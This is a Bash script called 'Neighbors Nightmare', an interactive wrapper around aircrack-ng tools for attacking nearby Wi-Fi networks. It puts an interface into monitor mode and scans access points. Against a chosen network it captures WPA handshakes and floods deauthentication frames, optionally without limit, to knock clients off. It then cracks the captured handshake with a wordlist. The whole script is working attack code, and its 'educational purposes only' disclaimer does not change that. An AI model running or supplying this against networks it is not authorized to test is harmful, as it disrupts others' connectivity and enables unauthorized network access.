#!/bin/bash

# Directory to save .cap files
capdir="${HOME}/airocap"
mkdir -p ${capdir}

usage() { echo "Usage: $0 [-m <1-4>]" 1>&2; exit 1; }

echo -e "\e[0;31m
███╗   ██╗███████╗██╗ ██████╗ ██╗  ██╗██████╗  ██████╗ ██████╗ ███████╗
████╗  ██║██╔════╝██║██╔════╝ ██║  ██║██╔══██╗██╔═══██╗██╔══██╗██╔════╝
██╔██╗ ██║█████╗  ██║██║  ███╗███████║██████╔╝██║   ██║██████╔╝███████╗
██║╚██╗██║██╔══╝  ██║██║   ██║██╔══██║██╔══██╗██║   ██║██╔══██╗╚════██║
██║ ╚████║███████╗██║╚██████╔╝██║  ██║██████╔╝╚██████╔╝██║  ██║███████║
╚═╝  ╚═══╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝

███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███╗   ███╗ █████╗ ██████╗ ███████╗
████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝████╗ ████║██╔══██╗██╔══██╗██╔════╝
██╔██╗ ██║██║██║  ███╗███████║   ██║   ██╔████╔██║███████║██████╔╝█████╗
██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██║╚██╔╝██║██╔══██║██╔══██╗██╔══╝
██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║ ╚═╝ ██║██║  ██║██║  ██║███████╗
╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝\e[0m
\e[1mWifi craking tool  -  made in front of aircrack-ng\e[0m

\e[1;31mDISCLAIMER:\e[0m This tool is for EDUCATIONAL PORPOSES ONLY.
Don't use it for illegal activities. You are the only responsable of your actions!
"

if [ "$EUID" -ne 0 ]
then echo -e "\e[1;31mPlease run it as root\e[0m"
    exit
fi

if [ ! -z $(/usr/sbin/iwconfig 2>/dev/null | grep "Mode:Monitor" | cut -d" " -f1) ]; then
    echo -e "\e[3;32mMonitor mode enabled !\e[0m"
else
    echo -e "\e[3;31mMonitor mode disabled !\e[0m"
fi

function main_menu {
    if [ -v $1 ]
    then
        echo -e "
\e[1;34m1)\e[0m Scan networks
\e[1;34m2)\e[0m Try to crack wifi password
\e[1;34m3)\e[0m Enable monitor mode
\e[1;34m4)\e[0m Disable monitor mode
        \e[1;34mX)\e[0m Exit script\n"
        
    fi
    
    if [ -z ${mode} ]; then
        echo -ne "\e[1mChoice :\e[0 m "
        
        read choice
    else
        choice=${mode}
    fi
    
    # in most of case, wlan0mon
    local imon=`/usr/sbin/iwconfig 2>/dev/null | grep "Mode:Monitor" | cut -d" " -f1`
    
    # save cap files in /tmp
    tmpDir="/tmp/airocap"
    mkdir -p ${tmpDir}
    rm -f ${tmpDir}/*
    
    case ${choice} in
        1)
            scan_net
        ;;
        2)  crack_menu
        ;;
        3) #airmon-ng check kill && airmon-ng start wlan0
            ip link set wlan0 down && airmon-ng start wlan0
            echo -e "\e[3;34mMonitor mode activated.\e[0m"
            [ -z $mode ] && main_menu || exit 1
        ;;
        4) airmon-ng stop ${imon} && service NetworkManager start
            echo -e "\e[3;34mMonitor mode disabled for ${imon}.\e[0m"
            [ -z $mode ] && main_menu || exit 1
        ;;
        X|x) echo "Bye !" && exit 1
        ;;
        *) echo -e "\e[1;31mInvalid choice\e[0m" && main_menu false
        ;;
    esac
}

scan_net () {
    if [ -z ${imon} ]; then
        echo -e "\e[1;31mYou don't have any monitor interfaces. Please enable monitor mode first (3)\e[0m"
        [ -z $mode ] && main_menu || exit 1
    fi
    airodump-ng ${imon} -w ${tmpDir}/res
    clear -x
    cat ${tmpDir}/res-01.csv | awk -F',' 'BEGIN {
     i=0
     mode=1
     line=0
     start=1
   }
   {
     if ($1 == "BSSID")
     {
       mode=1
       print "==> Access points"
     }
     else if ($1 == "Station MAC")
     {
       mode=2
       print "==> Devices"
     }
     else if ((mode == 1) && (length($1) == 17))
     {
        if (start == 1) {
            printf "%c[1;100m %3s)%-32s, %-6s,    %2s,   %10s,   %-17s%c[0m\n", 27, "id", " SSID", " Power", "CH", "Cipher", "Mac", 27
            start=0
        }
        if (line == 1)
        {
         printf " %3d)%-32s, %-4sdB,   %2s,   %10s,   %s\n", i, $14, $9, $4, $6, $1
         i++
         line=0
        }
        else if (line == 0)
        {
         printf "%c[1;40;30m %3d)%-32s, %-4sdB,   %2s,   %10s,   %s%c[0m\n", 27, i, $14, $9, $4, $6, $1, 27
         i++
         line=1
        }
     }
    }' | grep -v "^==>" > ${tmpDir}/menu1
    
    # Print net list
    cat ${tmpDir}/menu1
    
    prompt_net() {
        echo -n $'\n' "Input selected network id [R to rescan]: "
        read apnum
        if [ -z ${apnum} ]; then
            echo -e "\e[1;31mYou must input a number.\e[0m"
            prompt_net
            elif [ ${apnum} == "R" ] || [ ${apnum} == "r" ]; then
            mode=1 && main_menu false # back to main menu, directly in the scan option
            elif [ ! -z "${apnum##[0-9]*}" ] || (( ${apnum} < 0 )); then
            echo -e "\e[1;31mNetwork id must be a number.\e[0m"
            prompt_net
        fi
    }
    prompt_net
    
    apline=$(cat ${tmpDir}/menu1 | grep "${apnum})")
    apmac=$(echo ${apline} | grep -oE "([0-9a-fA-F]{2}:?){6}")
    apchannel=$(echo ${apline} | cut -d"," -f3 | grep -o "[1-9]*" )
    apname=$(echo ${apline} | cut -d")" -f2 | cut -d"," -f1 | xargs)
    
    echo -e "
    Selected network \e[1;34m${apname}\e[0m with mac address \e[1;34m${apmac}\e[0m on channel \e[1;34m${apchannel}\e[0m."
    attack_mode_menu
}

attack_mode_menu() {
    if [ -v $1 ]
    then echo -e "

\e[1;34mR)\e[0m Re-scan
\e[1;34m1)\e[0m Capture handshakes
\e[1;34m2)\e[0m Deauthentify this network
\e[1;34m3)\e[0m Capture handshakes & Deauthentify this network
\e[1;34mB)\e[0m Back to main menu
        \e[1;34mX)\e[0m Exit script"
    fi
    
    echo -ne $'\n' "\e[1mChoice :\e[0m "
    
    read attackmode
    case ${attackmode} in
        R|r) mode=1 && main_menu false
        ;;
        1) capsave="${capdir}/${apmac}/"
            mkdir -p ${capsave}
            rm -f ${capsave}/*
            airodump-ng --bssid ${apmac} -c ${apchannel} -w "${capsave}/out" ${imon}
            main_menu
        ;;
        2) echo -n "Number of deauthentification requests you want to send (0 for unlimited) [default 10]: "
            read deauthnbr
            if [ -z ${deauthnbr} ] || [ ! -z "${deauthnbr##[0-9]*}" ] || (( ${deauthnbr} < 0 )) 2>/dev/null; then
                echo -e "\e[1;31mInvalid choice, using 10.\e[0m"
                deauthnbr=10
            fi
            iwconfig ${imon} channel ${apchannel}
            aireplay-ng -0 ${deauthnbr} -a ${apmac} ${imon}
            attack_mode_menu
        ;;
        3)clear -x
            echo -e "\e[1;31mNOTE:\e[0m \e[3mTo stop deauth, simply Ctrl+C in the popup terminal window.\e[0m"
            echo -n "Number of deauthentification requests you want to send (0 for unlimited) [default 10]: "
            read deauthnbr
            if [ -z ${deauthnbr} ] || [ ! -z "${deauthnbr##[0-9]*}" ] || (( ${deauthnbr} < 0 )) 2>/dev/null; then
                echo -e "\e[1;31mInvalid choice, using 10.\e[0m"
                deauthnbr=10
            fi
            capsave="${capdir}/${apmac}"
            mkdir -p ${capsave}
            rm -f ${capsave}/*
            iwconfig ${imon} channel ${apchannel}
            gnome-terminal --tab -- sh -c "aireplay-ng -0 ${deauthnbr} -a ${apmac} ${imon}"
            airodump-ng --bssid ${apmac} -c ${apchannel} -w "${capsave}/out" ${imon}
            attack_mode_menu
        ;;
        B|b) main_menu
        ;;
        X|x) echo "Bye !" && exit 1
        ;;
        *) echo -e "\e[1;31mInvalid choice\e[0m" && attack_mode_menu false
        ;;
        
    esac
}

crack_menu (){
    list=""
    i=0
    capdirlist=$(ls -t ${capdir} | tr ' ' '\n')
    for dir in ${capdirlist}; do
        list+="\e[1;34m${i})\e[0m ${dir}"
        [[ $i -eq 0 ]] && list+="         \e[3;34mrecent\e[0m"
        list+=$'\n'
        ((++i))
    done
    [[ -z $1 ]] && echo -e "${list}"
    
    echo -ne "\e[1mChoice : \e[0m"
    read macchoice
    if [ -z ${macchoice} ] || (( ${macchoice} >= ${i} )); then
        echo -e "\e[1;31mInvalid choice\e[0m" && crack_menu false
    fi
    
    selmac=$(echo -e "$list" | grep "${macchoice})" | grep -oE "([0-9a-fA-F]{2}:?){6}")
    echo "Selected MAC: ${selmac}"
    wordlist=$(zenity --file-selection --title="Select a wordlist" --file-filter="*.txt *.lst")
    echo "${capdir}/${selmac}/*.cap" $wordlist
    aircrack-ng "${capdir}/${selmac}/out-01.cap" -w "${wordlist}"
}

# Parse flags
while getopts ":m:" option; do
    case "${option}" in
        m)
            mode=${OPTARG}
            # ((mode < 1 || mode > 4)) || usage
        ;;
        *)
            usage
        ;;
    esac
done

# Allow to use $1
shift $((OPTIND-1))

if [ ! -z "${mode}" ]; then
    main_menu false
else
    main_menu
fi